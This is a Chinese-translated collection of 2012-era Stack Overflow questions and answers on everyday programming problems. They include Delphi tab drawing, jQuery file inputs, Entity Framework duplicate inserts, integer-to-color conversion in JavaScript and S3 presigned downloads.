该软件包`neuralnet`使用网格图形。这意味着您需要`print`在非交互模式下进行绘图。

尝试这个：

```
png("iris.png")
print(plot(nn))
dev.off() 
```

# asp.net - 从 ASP.NET 启动新进程失败

> ID：11866745
> 
> 赞同：1
> 
> 时间：2012-08-08T14:29:20.103
> 
> 标签：asp.net, wcf, process

我正在尝试从我的 WCF 服务启动一个新进程。为此我使用

```
var process = Process.Start(
    new ProcessStartInfo { WorkingDirectory = config.WorkingDirectory,
                           FileName = config.WorkingDirectory,
                           Arguments = string.Format("{0} {1}", mpcName, jobId),
                           CreateNoWindow = false,
                           WindowStyle = ProcessWindowStyle.Hidden }); 
```

WebApp 正在使用一个单独的 AppDomain，其身份设置为在服务器上具有管理员权限的用户帐户。

Process.Start 抛出异常告诉

```
Server execution failed,    at System.Diagnostics.Process.StartWithShellExecuteEx(ProcessStartInfo startInfo) 
```

我还测试了在 ProcessStartInfo 中设置用户和密码。指定密码非常棘手（SecureString），然后我收到了

```
The stub received bad data,    at System.Diagnostics.Process.StartWithCreateProcess(ProcessStartInfo startInfo) 
```

所以我跳过了这种方式。

你知道我的问题的原因是什么以及我该如何解决它。

我忘记了：我使用的是 Windows Server 2008 R2、IIS 7

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:11:46.587

我知道了！

这很奇怪，但唯一需要的改变是调用

```
Process.Start(exeFullPath, args); 
```

显然 ProcessStartInfo 道具的组合很重要。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-03-19T17:29:34.547

这个 q/a 帮助我在我的一个项目中解决了这个问题，但原因不同——

试图从 nCrunch 运行的集成测试中以域用户身份启动进程。原来我的问题是一个很长的参数字符串。

（相同的参数字符串在没有用户/密码的情况下工作）

环境是 Windows 8, 64 位。

无论如何，只需要以不同的方式传递 arg 数据。

# postgresql - 在 postgreSQL 中连接到服务器时出错

> ID：11866748
> 
> 赞同：-1
> 
> 时间：2012-08-08T14:29:21.860
> 
> 标签：postgresql

我正在尝试在 postgreSQL 中添加与服务器的连接。但是当我填写所有详细信息时，我得到了这个错误

```
Error connecting to the server: FATAL: role "abc" does not exist. 
```

“abc”是我要创建的用户名。

我为此使用 Tomcat 服务器 Eclipse。

请帮我找到解决这个问题的方法。

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:31:40.053

如果用户尚不存在，您必须以管理员身份登录并[创建它，](http://www.cyberciti.biz/faq/howto-add-postgresql-user-account/)然后才能以该用户身份登录。

# delphi - 如何更改主题 TabSheet 标题的文本颜色？

> ID：11866751
> 
> 赞同：6
> 
> 时间：2012-08-08T14:29:23.023
> 
> 标签：delphi, tpagecontrol

再会！

我需要更改 TPageControl 中某些 TabSheet 标题的文本颜色。图片上有这样的东西

![在此处输入图像描述](../Images/1eeb2a349b0890e9046b1d3e203bda86.png)

我知道如何使用 OnDrawTab 来完成。但是如果我启用 OwnerDraw，Windows XP 主题的装饰就会消失。这就是为什么我尝试手动绘制这种装饰。这就是我尝试这样做的方式：

```
procedure TForm1.PageControl1DrawTab(Control: TCustomTabControl;
  TabIndex: Integer; const Rect: TRect; Active: Boolean);
var
  FRect: TRect;
  Text: string;
begin
  FRect := Control.TabRect(TabIndex);
  if Active then
    ThemeServices.DrawElement(Control.Canvas.Handle, ThemeServices.GetElementDetails(ttTabItemHot), FRect)
  else
    ThemeServices.DrawElement(Control.Canvas.Handle, ThemeServices.GetElementDetails(ttTabItemNormal), FRect);
  Text := PageControl1.Pages[TabIndex].Caption;
  Control.Canvas.Brush.Style := bsClear;
  if not Active then
    FRect.Top := FRect.Top + 4;
  DrawText(Control.Canvas.Handle, PChar(Text), Length(Text), FRect, DT_SINGLELINE or DT_CENTER or DT_VCENTER);
end; 
```

我得到了这个

![在此处输入图像描述](../Images/8060c21015b86b115f81c6bf40d715c3.png)

（左 - OwnerDraw 版本，右 - 默认绘制）

如您所见，TabSheets 有一些没有被透支的边框。我不能透支这个边界。

如何正确绘制选项卡的背景（如右侧的 PageControl）？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-08T17:20:38.897

一个可能的解决方案是覆盖而不是使用 ownerdraw 的`PaintWindow`方法[`TPageControl`](http://docwiki.embarcadero.com/Libraries/en/Vcl.ComCtrls.TPageControl)，这样您就可以控制选项卡的每个视觉方面。

检查此基本示例。

```
type
  TPageControl = class(Vcl.ComCtrls.TPageControl)
  private
    FColorTextTab: TColor;
    procedure  DrawTab(LCanvas: TCanvas; Index: Integer);
    procedure  DoDraw(DC: HDC; DrawTabs: Boolean);
    procedure SetColorTextTab(const Value: TColor);
  protected
    procedure PaintWindow(DC: HDC); override;
  published
    property  ColorTextTab : TColor read FColorTextTab write SetColorTextTab;

  end;

  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    CheckBox1: TCheckBox;
    Button2: TButton;
    Button3: TButton;
    Button4: TButton;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    TabSheet6: TTabSheet;
    procedure FormCreate(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

uses
 Math,
 Themes,
 Types;

type
  TCustomTabControlClass = class(TCustomTabControl);

procedure AngleTextOut2(Canvas: TCanvas; Angle: Integer; X, Y: Integer; const Text: string);
var
  NewFontHandle, OldFontHandle: hFont;
  LogRec: TLogFont;
begin
  GetObject(Canvas.Font.Handle, SizeOf(LogRec), Addr(LogRec));
  LogRec.lfEscapement := Angle * 10;
  LogRec.lfOrientation := LogRec.lfEscapement;
  NewFontHandle := CreateFontIndirect(LogRec);
  OldFontHandle := SelectObject(Canvas.Handle, NewFontHandle);
  SetBkMode(Canvas.Handle, TRANSPARENT);
  Canvas.TextOut(X, Y, Text);
  NewFontHandle := SelectObject(Canvas.Handle, OldFontHandle);
  DeleteObject(NewFontHandle);
end;

{ TPageControl }
procedure TPageControl.DrawTab(LCanvas: TCanvas; Index: Integer);
var
  LDetails    : TThemedElementDetails;
  LImageIndex : Integer;
  LThemedTab  : TThemedTab;
  LIconRect   : TRect;
  R, LayoutR  : TRect;
  LImageW, LImageH, DxImage : Integer;
  LTextX, LTextY: Integer;
  LTextColor    : TColor;
    //draw the text in the tab
    procedure DrawControlText(const S: string; var R: TRect; Flags: Cardinal);
    var
      TextFormat: TTextFormatFlags;
    begin
      LCanvas.Font       := Font;
      TextFormat         := TTextFormatFlags(Flags);
      LCanvas.Font.Color := LTextColor;
      StyleServices.DrawText(LCanvas.Handle, LDetails, S, R, TextFormat, LCanvas.Font.Color);
    end;

begin
  //get the size of tab image (icon)
  if (Images <> nil) and (Index < Images.Count) then
  begin
    LImageW := Images.Width;
    LImageH := Images.Height;
    DxImage := 3;
  end
  else
  begin
    LImageW := 0;
    LImageH := 0;
    DxImage := 0;
  end;

  R := TabRect(Index);

  //check the left position of the tab.
  if R.Left < 0 then Exit;

  //adjust the size of the tab to draw
  if TabPosition in [tpTop, tpBottom] then
  begin
    if Index = TabIndex then
      InflateRect(R, 0, 2);
  end
  else
  if Index = TabIndex then
    Dec(R.Left, 2)
  else
    Dec(R.Right, 2);

  LCanvas.Font.Assign(Font);
  LayoutR := R;
  LThemedTab := ttTabDontCare;
  //Get the type of the active tab to draw

  case TabPosition of
    tpTop:
      begin
        if Index = TabIndex then
          LThemedTab := ttTabItemSelected
        else
        {
        if (Index = HotTabIndex) and MouseInControl then
          LThemedTab := ttTabItemHot
        else
        }
          LThemedTab := ttTabItemNormal;
      end;
    tpLeft:
      begin
        if Index = TabIndex then
          LThemedTab := ttTabItemLeftEdgeSelected
        else
        {
        if (Index = HotTabIndex) and MouseInControl then
          LThemedTab := ttTabItemLeftEdgeHot
        else
        }
          LThemedTab := ttTabItemLeftEdgeNormal;
      end;
    tpBottom:
      begin
        if Index = TabIndex then
          LThemedTab := ttTabItemBothEdgeSelected
        else
        {
        if (Index = HotTabIndex) and MouseInControl then
          LThemedTab := ttTabItemBothEdgeHot
        else
        }
          LThemedTab := ttTabItemBothEdgeNormal;
      end;
    tpRight:
      begin
        if Index = TabIndex then
          LThemedTab := ttTabItemRightEdgeSelected
        else
        {
        if (Index = HotTabIndex) and MouseInControl then
          LThemedTab := ttTabItemRightEdgeHot
        else
        }
          LThemedTab := ttTabItemRightEdgeNormal;
      end;
  end;

  //draw the tab
  if StyleServices.Available then
  begin
    LDetails := StyleServices.GetElementDetails(LThemedTab);//necesary for DrawControlText and draw the icon
    StyleServices.DrawElement(LCanvas.Handle, LDetails, R);
  end;

  //get the index of the image (icon)
  if Self is TCustomTabControl then
    LImageIndex := TCustomTabControlClass(Self).GetImageIndex(Index)
  else
    LImageIndex := Index;

  //draw the image
  if (Images <> nil) and (LImageIndex >= 0) and (LImageIndex < Images.Count) then
  begin
    LIconRect := LayoutR;
    case TabPosition of
      tpTop, tpBottom:
        begin
          LIconRect.Left := LIconRect.Left + DxImage;
          LIconRect.Right := LIconRect.Left + LImageW;
          LayoutR.Left := LIconRect.Right;
          LIconRect.Top := LIconRect.Top + (LIconRect.Bottom - LIconRect.Top) div 2 - LImageH div 2;
          if (TabPosition = tpTop) and (Index = TabIndex) then
            OffsetRect(LIconRect, 0, -1)
          else
          if (TabPosition = tpBottom) and (Index = TabIndex) then
            OffsetRect(LIconRect, 0, 1);
        end;
      tpLeft:
        begin
          LIconRect.Bottom := LIconRect.Bottom - DxImage;
          LIconRect.Top := LIconRect.Bottom - LImageH;
          LayoutR.Bottom := LIconRect.Top;
          LIconRect.Left := LIconRect.Left + (LIconRect.Right - LIconRect.Left) div 2 - LImageW div 2;
        end;
      tpRight:
        begin
          LIconRect.Top := LIconRect.Top + DxImage;
          LIconRect.Bottom := LIconRect.Top + LImageH;
          LayoutR.Top := LIconRect.Bottom;
          LIconRect.Left := LIconRect.Left + (LIconRect.Right - LIconRect.Left) div 2 - LImageW div 2;
        end;
    end;
    if StyleServices.Available then
      StyleServices.DrawIcon(LCanvas.Handle, LDetails, LIconRect, Images.Handle, LImageIndex);
  end;

  //draw the text of the tab
  if StyleServices.Available then
  begin
    //StyleServices.GetElementColor(LDetails, ecTextColor, LTextColor);
    LTextColor:=FColorTextTab;

    if (TabPosition = tpTop) and (Index = TabIndex) then
      OffsetRect(LayoutR, 0, -1)
    else
    if (TabPosition = tpBottom) and (Index = TabIndex) then
      OffsetRect(LayoutR, 0, 1);

    if TabPosition = tpLeft then
    begin
      LTextX := LayoutR.Left + (LayoutR.Right - LayoutR.Left) div 2 - LCanvas.TextHeight(Tabs[Index]) div 2;
      LTextY := LayoutR.Top + (LayoutR.Bottom - LayoutR.Top) div 2 + LCanvas.TextWidth(Tabs[Index]) div 2;
      LCanvas.Font.Color:=LTextColor;
      AngleTextOut2(LCanvas, 90, LTextX, LTextY, Tabs[Index]);
    end
    else
    if TabPosition = tpRight then
    begin
      LTextX := LayoutR.Left + (LayoutR.Right - LayoutR.Left) div 2 + LCanvas.TextHeight(Tabs[Index]) div 2;
      LTextY := LayoutR.Top + (LayoutR.Bottom - LayoutR.Top) div 2 - LCanvas.TextWidth(Tabs[Index]) div 2;
      LCanvas.Font.Color:=LTextColor;
      AngleTextOut2(LCanvas, -90, LTextX, LTextY, Tabs[Index]);
    end
    else
     DrawControlText(Tabs[Index], LayoutR, DT_VCENTER or DT_CENTER or DT_SINGLELINE  or DT_NOCLIP);
  end;
end;

procedure TPageControl.DoDraw(DC: HDC; DrawTabs: Boolean);
var
  Details: TThemedElementDetails;
  R: TRect;
  LIndex, SelIndex: Integer;
begin
  Details := StyleServices.GetElementDetails(ttTabItemNormal);
  SelIndex := TabIndex;
  try
    Canvas.Handle := DC;
    if DrawTabs then
      for LIndex := 0 to Tabs.Count - 1 do
        if LIndex <> SelIndex then
         DrawTab(Canvas, LIndex);

    if SelIndex < 0 then
      R := Rect(0, 0, Width, Height)
    else
    begin
      R := TabRect(SelIndex);
      R.Left := 0;
      R.Top := R.Bottom;
      R.Right := Width;
      R.Bottom := Height;
    end;

    StyleServices.DrawElement(DC, StyleServices.GetElementDetails(ttPane), R);

    if (SelIndex >= 0) and DrawTabs then
      DrawTab(Canvas, SelIndex);
  finally
    Canvas.Handle := 0;
  end;
end;

procedure TPageControl.PaintWindow(DC: HDC);
begin
 DoDraw(DC, True);
 //inherited;
end;

procedure TPageControl.SetColorTextTab(const Value: TColor);
begin
  FColorTextTab := Value;
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
  PageControl1.ColorTextTab:=clGreen;
end; 
```

这就是结果。

![在此处输入图像描述](../Images/e6a0d2227c3e135682cb1ab92357db68.png)

# xml - XPATH 2.0 创建查询

> ID：11866755
> 
> 赞同：0
> 
> 时间：2012-08-08T14:29:29.733
> 
> 标签：xml, xpath

我有xml文件

```
<?xml version="1.0" encoding="UTF-8"?>
<quo:Zaklad xmlns:quo="http://www.xxx.com/XMLSchema/Zaklad" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.xxx.com/XMLSchema/xxx.xsd" quo:nr="356-12">
   <quo:id_produktu>304</quo:id_produktu>
   <quo:wersja_produktu>3</quo:wersja_produktu>
   <quo:Nazwa_produktu>
</quo:Zaklad> 
```

如何在 xpath 2.o 中创建返回 id_produktu 的查询？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T14:33:15.990

您可以使用 local-name 获取与命名空间无关的 xpath，如下所示：

```
/*[local-name()='Zaklad']/*[local-name()='id_produktu']/text() 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:35:21.710

假设您正在使用设置有相同名称空间的名称空间管理器的简单情况，您可以使用以下内容吗？

```
/quo:Zaklad/quo:id_produktu 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T15:23:43.857

您可以使用`local-name()`函数来获取节点的名称。

```
local-name(/*/quo:id_produktu) 
```

上面的 xpath 表达式将返回您`id_produktu`。您应该使用您选择的编程语言让 Xpath 引擎知道 xpath 中存在的名称空间前缀。

**[您可以在此处](http://www.w3schools.com/xpath/xpath_functions.asp#node)**获取有关此功能的更多信息

# javascript - 无法清除javascript jquery中的输入类型=文件

> ID：11866757
> 
> 赞同：5
> 
> 时间：2012-08-08T14:29:46.913
> 
> 标签：javascript, jquery, asp.net, input

> **可能重复：**
> [使用 jQuery 清除 <input type='file' />](https://stackoverflow.com/questions/1043957/clearing-input-type-file-using-jquery)

这是我的代码：

```
 <input ID="fileUpload1" runat="server" type="file" style="width:275px; position:absolute; left:1px"/> 
```

我尝试了一些解决方案：

```
$("input[type='file']").val('');
$('#DivfileUpload').replaceWith("<input class=VWButton ID=fileUpload1 runat=server type=file style=width:275px; position:absolute; left:1px/>"); 
```

以及来自网络的许多其他人，但没有成功。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-08-08T14:31:18.940

出于（明显的）安全原因，您不能设置文件输入的值。

如果要清除它，则需要重置它所在的表单。

* * *

用新的替换它也应该有效，但要使用有效的代码。（这意味着不要尝试包含诸如 ASP`runat=server`属性/值之类的服务器端代码，并且不要引用不是普通单词的属性值（例如您的样式属性））。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-08T15:08:23.807

出于安全原因，在某些浏览器（如 IE）中尝试使用 .val('') 设置值会失败。

您最好的选择是重置表单：

```
$('form').trigger('reset'); 
```

* * *

或者使用您的替换代码，稍作修改（确保 HTML 有效）：

```
$('#fileUpload1').replaceWith('<input id="fileUpload1" type="file" style="width:275px; position:absolute; left:1px"/>'); 
```

如果您使用 CSS 设置框的样式，您的代码会变得更加简单。

CSS：

```
#fileUpload1 {
    width: 275px;
    position: absolute;
    left: 1px;
} 
```

JavaScript：

```
$('#fileUpload1').replaceWith('<input id="fileUpload1" type="file"/>'); 
```

* * *

一个更高级的选项是在页面加载时隐藏文件上传框，然后创建一个向用户显示的副本。当你需要清除它时，你删除克隆，然后重新克隆原来隐藏的那个。如果您希望允许用户上传多个文件，此方法还允许您制作输入框的多个副本。我将把实现细节留给你。;)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-08-08T14:38:08.073

```
$(function() { 
  $('#fileUpload1').val(''); 
}); 
```

# jquery - 防止jquery在后退按钮上准备好

> ID：11866758
> 
> 赞同：0
> 
> 时间：2012-08-08T14:29:53.590
> 
> 标签：jquery

我有一个索引非常长的网站。我使用 jQuery 隐藏所有嵌套项，并且仅在页面加载时显示主要类别。

```
jQuery(document).ready(function($) {    
  $('div.sideNav li > ul').css({"display":"none"}); //hide all nested ul's
}); 
```

我有另一个脚本可以在用户单击它们时展开和折叠索引类别项。

但在类别内部是指向实际文档的链接，这些文档是 pdf。因此，如果有人单击 pdf 来查看它，它会导航到新页面。然后当他们完成查看时，他们点击后退按钮，他们希望看到索引扩展为他们离开之前的方式，以便他们可以继续浏览索引。

现在，当页面从 pdf 返回并将索引折叠回其初始状态时，将调用 ready 函数。如何防止这种情况，以便嵌套列表项仅在页面加载时隐藏？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-08T14:32:19.220

我认为最简单的解决方案是使用以下命令在新窗口中打开 PDF `target="_blank"`：

```
<a href="pdf-path-here" target="_blank">View PDF</a> 
```

这样，用户将关闭新选项卡，页面将与以前一样。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-08T14:31:58.527

与其担心如果有人单击后退按钮如何处理，我建议您只需在新窗口中打开 PDF。这将允许用户直接关闭 PDF，然后您不必担心保留前一页的状态。

`target`如果您不确定单击链接时如何生成新窗口，您将需要使用该属性：

```
<a href="pdf-link" target="_blank">Open PDF</a> 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-08T14:33:29.443

使用cookies或者localStorage来存储索引展开方式的数据，`jQuery(document).ready()`调用的时候，读取其中存储的数据，确定要展开哪些项目。当访问者单击链接并返回时，页面会再次加载，除非保存数据，否则数据将丢失。

编辑：如果您希望他们在同一选项卡或窗口中打开链接，那就是

# actionscript-3 - AIR：使用 URLStream() 在 OSX（但不是 Windows）上的 securityError

> ID：11866761
> 
> 赞同：0
> 
> 时间：2012-08-08T14:30:01.727
> 
> 标签：actionscript-3, flash, apache-flex, air, sandbox

我正在使用 URLStream 从硬盘加载文件（我想继续使用 URLStream 这样做）。该文件位于“app-storage:/myfolder/myFile.zip”

所以我用

```
var f:File = new File("app-storage:/myfolder/myFile.zip");
myStream.load(new URLRequest(f.nativePath)); 
```

在 Windows 上，这似乎可以正常工作 - 但在 OS X 上，URLStream 会发送带有以下消息的 SecurityErrorEvent.SECURITY_ERROR：

```
Error #2032: Stream Error. URL: app:/Users/myUserName/Library/Preferences/MyAppName/Local%20Store/myfolder/myFile.zip 
```

有人可以解释一下为什么这适用于 Windows 但不适用于 OS X 以及如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T17:25:24.740

好老的，模棱两可的错误2032！

您可能想尝试：

```
var f:File = new File(File.applicationStorageDirectory + "/myFolder/myFile.zip"); 
```

**编辑**

我最初的评论是使用该`File.applicationStorageDirectory`属性，我仍然认为这是一个好主意。但看起来该属性归结为您正在使用的相同字符串......所以问题可能是存储目录的位置已更改并且您要查找的文件仍在原始位置？请参阅下面的链接。

**结束编辑**

请注意[此处](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/filesystem/File.html#applicationStorageDirectory)有关仅适用于 Mac OSX 的 Air 3.3 中对此路径所做的更改的评论。即使这不能解决您的问题，如果路径更改或某些其他设备/操作系统需要不同的“模式”，使用此属性应该可以保护您的代码免受未来问题的影响。

# asp.net - 如何在 ASP.NET 1.1 中注册和使用 DLL 文件

> ID：11866767
> 
> 赞同：0
> 
> 时间：2012-08-08T14:30:21.790
> 
> 标签：asp.net, vb.net, asp.net-1.1

我已经在 BIN 文件夹中移动了几个 DLL 文件，但 Visual Studio 没有拾取这些文件。我需要为 1.1 手动注册它们吗？

我知道在以后的框架中，它就像在 BIN 文件夹中移动 DLL 文件一样简单，但对于框架 1.1 却不起作用。有什么我想念的吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T01:55:12.267

You just need to declare your assemblies to your web.config just like the following:

```
<configuration>
  <system.web>
   <compilation>
      <assemblies>
         <add assembly="MyDll"/>
      </assemblies>
   </compilation>
  </system.web>

</configuration> 
```

You'll have also to make sure that your dll are compiled for .NET 1.1\. Or else, it won't work.

Hope this helps you. Let us know if it is still not working.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-08T14:34:24.347

您应该在项目中引用 DLL。

更多信息如下；

[http://msdn.microsoft.com/en-us/library/wkze6zky(v=vs.71).aspx](http://msdn.microsoft.com/en-us/library/wkze6zky(v=vs.71).aspx)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-08T16:12:22.437

运行 MSI 文件并重新启动 Visual Studio 2003 解决了该问题。ASPOSE.CELLS.DLL 与 1.1 兼容，因此向后兼容性不是问题。

# asp.net - DbContext.SaveChanges

> ID：11866768
> 
> 赞同：0
> 
> 时间：2012-08-08T14:30:26.773
> 
> 标签：asp.net, entity-framework

我有一个问题，将一条记录插入实体 ProfessionalEmploymentRecord EF 最终会分别在每个实体中复制现有的 Professional、Program、Role 记录。我试图用我的数据库中的现有键/值对显式地初始化专业、程序、角色，但 EF 仍然使用新键创建重复值。

```
public class ProfessionalEmploymentRecord
{
    public int ProfessionalEmploymentRecordId {get; set; }

    public virtual Professional Professional { get; set; }
    public virtual Program Program { get; set; }
    public virtual Role Role { get; set; }
}
public class Program
{
    public int ProgramId { get; set; }
    [MaxLength(20)]
    public string Name { get; set; }
}
public class Role
{
    public int RoleId { get; set; }
    [MaxLength(50)]
    public string Name { get; set; }
}
public class Professional
{
    public int ProfessionalId { get; set; }
    [MaxLength(20)]
    public string Name { get; set; }
} 
```

当使用下面的创建时，我最终会在三个相关实体中得到新记录，尽管它们存在并且有一个键集。换句话说，我最终在三个相关实体中得到了具有新主键（加一）的值副本。

```
 public ActionResult Create(ProfessionalEmploymentRecord professionalemploymentrecord)
    {
        if (ModelState.IsValid)
        {
            db.ProfessionalEmploymentRecords.Add(professionalemploymentrecord);
            db.SaveChanges();
            return RedirectToAction("Index");  
        }
        return View(professionalemploymentrecord);
    } 
```

按照要求

```
@model My.Models.ProfessionalEmploymentRecord
@{
ViewBag.Title = "Create";
}
<h2>Create</h2>
@using (Html.BeginForm()) {
@Html.ValidationSummary(true)
<fieldset>
    <legend> Professional Employment Record</legend>

    <div class="editor-label">
        Professional
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.Professional.Name)
        @Html.ValidationMessageFor(model => model.Professional.Name)
    </div>
    <div class="editor-label">
         Program
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.Program.Name)
        @Html.ValidationMessageFor(model => model.Program.Name)
    </div>
    <div class="editor-label">
         Role
    </div>
    <div class="editor-field">
        @Html.EditorFor(model => model.Role.Name)
        @Html.ValidationMessageFor(model => model.Role.Name)
    </div>
    <p>
        <input type="submit" value="Create" />
    </p>
</fieldset>
}

<div>
@Html.ActionLink("Back to List", "Index")
</div> 
```

我已经使用下面的代码进行测试。（我看到执行 SaveChanges 会在 reco 中设置 *Id++）。

```
 public void TestDummyAdd()
    {
        Professional prof = new Professional { ProfessionalId = 1, Name = "Chris" };
        Program prog = new Program { ProgramId = 1, Name = "A" };
        Role role = new Role { RoleId = 1, Name = "B" };
        ProfessionalEmploymentRecord reco = new ProfessionalEmploymentRecord { Professional = prof, Role = role, Program = prog, ProfessionalEmploymentRecordId = 0 };

        if (ModelState.IsValid)
        {
            db.ProfessionalEmploymentRecords.Add(reco);
            db.SaveChanges();
        }
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-08T15:01:48.707

添加是对整个对象图执行的操作。如果您添加您的记录，您还将添加它的所有关系、它们的关系等。有两种方法可以解决此问题，并且都需要您在持久对象图谱中手动设置某些实体（有时还包括关系）的状态：

*   像你一样调用`Add`，但之后你必须将图中所有现有实体的状态设置为`Unchanged`or `Modified`（实体将在数据库中更新）
*   调用`Attach`而不是`Add`在所有新实体的设置状态之后调用`Added`

设置状态可以通过：

```
db.Entry(entity).State = EntityState.Added; 
```

# javascript - 如何将整数转换为 javascript 颜色？

> ID：11866781
> 
> 赞同：15
> 
> 时间：2012-08-08T14:30:53.367
> 
> 标签：javascript

我有一个整数，需要将其转换为 javascript 中的颜色。我正在使用 MVC 模型，并试图在 Web 界面的软件中复制模型。我有数据库中整数格式的颜色。它需要在javascript中转换为颜色。

例如：整数，如 -12525360、-5952982

我有这样的代码：

```
items[x].barStyle = "stroke: Black; fill = Red"; 
```

因此，我需要给它对应于整数值的确切颜色，而不是填充：红色。

这是我用 C# 编写的代码。我在javascript中需要同样的东西。这里 resourcecolor= 整数输入。

```
 var bytes = BitConverter.GetBytes(resourcecolor);
     ti.color = Color.FromArgb(bytes[3], bytes[2], bytes[1], bytes[0]); 
```

* * *

## 回答 #1

> 赞同：26
> 
> 时间：2012-08-08T14:40:52.743

在 javascript 中，您将要与 canvas 或 css 一起使用的 ARGB 颜色表示为字符串，例如`"rgba(0-255,0-255,0-255,0-1)"`.

您可以使用此函数将整数转换为该字符串格式：

```
function toColor(num) {
    num >>>= 0;
    var b = num & 0xFF,
        g = (num & 0xFF00) >>> 8,
        r = (num & 0xFF0000) >>> 16,
        a = ( (num & 0xFF000000) >>> 24 ) / 255 ;
    return "rgba(" + [r, g, b, a].join(",") + ")";
}
toColor(-5952982)
//"rgba(165,42,42,1)"
toColor(-12525360)
//"rgba(64,224,208,1)" 
```

演示：http: [//jsfiddle.net/Ectpk/](http://jsfiddle.net/Ectpk/)

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-08-08T14:34:03.173

尝试：

hexColor = yourNumber.toString(16)

您可能也想规范化“yourNumber”。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2019-01-28T17:16:54.147

真的很简单：

```
colorString = "#" + colour.toString(16).padStart(6, '0'); 
```

但是当我实际引用它时，我也会从整数中删除 alpha 并同时设置样式颜色，所以整行是：

```
document.getElementById('selectColourBtn').style.color = "#" +
    (colour & 0x00FFFFFF).toString(16).padStart(6, '0'); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-09T20:47:17.507

***披露****：我是下面建议的图书馆的作者。*

如果您想使用库而不是自己编写代码，[pusher.color](http://surfacecurve.org/libraries/color) Javascript 库支持整数到 HTML 颜色转换：

```
// Will set c to "rgba(105,80,131,1.0)"
var c = pusher.color('packed_argb', -9875325).html() 
```

或者，如果您想要不同的格式：

```
var colorObject = pusher.color('packed_argb', -9875325);
var htmlString = colorObject.html();          // i.e. "rgba(105,80,131,1.0)"
var colorName  = colorObject.html('keyword'); // closest named color
var hexString  = colorObject.html('hex6');    // "#695083" 
```

[该库在内部使用与Esailija 的](https://stackoverflow.com/users/995876/esailija)答案非常相似的代码。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-08-08T14:57:05.580

阅读有关该问题的评论，您似乎能够在服务器上的值发送到客户端之前对其进行操作。如果您使用的是 .NET，我建议使用`ColorTranslator`

```
int intColor = -12525360;
string htmlColor = ColorTranslator.ToHtml(Color.FromArgb(intColor)); //#40E0D0 
```

或者这个（如果你需要 alpha 通道）：

```
 int intColor = -12525360;
   Color c = Color.FromArgb(intColor);
   string htmlColor = String.Format(CultureInfo.InvariantCulture, 
                        "rgba({0},{1},{2},{3})", c.R, c.G, c.B, c.A / 255f); 
```

# java - Amazon S3 初学者查询

> ID：11866782
> 
> 赞同：0
> 
> 时间：2012-08-08T14:30:55.063
> 
> 标签：java, amazon-s3

我有一个由 2 个应用程序**A**和**B**组成的分布式系统。

B 调用 A 的特定 API，在此期间执行底层工作流，文件 a 生成并上传到`S3`. **A**在上传之前对文件进行客户端加密。对**B**的API响应是上传文件的bucket+link位置。

现在在稍后的时间点，**B**希望从 S3 下载文件。

有两种方法可以做到这一点 -

1.  **在B**端实现下载功能，在这种情况下，它需要知道**A**用来上传的 AWS 密钥。
2.  让**A向****B**公开一个`download`功能，这样**B**就不需要知道**A**用来上传的 AWS 密钥。

 ******选项 2 似乎是做事的正确方法。
我的理解是正确的还是有第三种更合理的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-08T15:46:05.233

您可能希望考虑使用查询字符串身份验证的“中途之家”。本质上，当 B 想要下载文件时，它会向 A 发出请求，要求提供下载链接。然后 A 生成一个限时的[预签名请求 URL](http://docs.amazonwebservices.com/AmazonS3/latest/dev/RESTAuthentication.html#RESTAuthenticationQueryStringAuth)，然后 B 可以使用该 URL 直接从 S3 下载文件。

当您将问题标记为“java”时，我假设您使用的是 AWS Java SDK，在这种情况下，您需要的方法`generatePresignedUrl`是[AmazonS3Client](http://docs.amazonwebservices.com/AWSJavaSDK/latest/javadoc/com/amazonaws/services/s3/AmazonS3Client.html)******

# java - 如何在 GWT 2.4 中折叠/展开 CellTable

> ID：11866783
> 
> 赞同：2
> 
> 时间：2012-08-08T14:30:59.623
> 
> 标签：java, gwt

我想要一个带有折叠/展开行的 CellTable。我已经看到在 GWT 2.5 中有一种方法可以做到这一点，但我无法在 GWT 2.4 中找到一种方法来做到这一点。

我尝试使用 CellTree，但 CellTree 仅支持一列，我需要在子节点中使用 3 或 4 列。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-10T06:54:15.210

[Smart GWT](http://www.smartclient.com/smartgwt/showcase/#grid_memo_rows)库有您正在寻找的东西。除此之外，您可能必须自己构建它。如果您现在开始一个新项目，只需使用 GWT 2.5 RC 运行并在可用时将其替换为最终版本，就不会再有太多更改了。

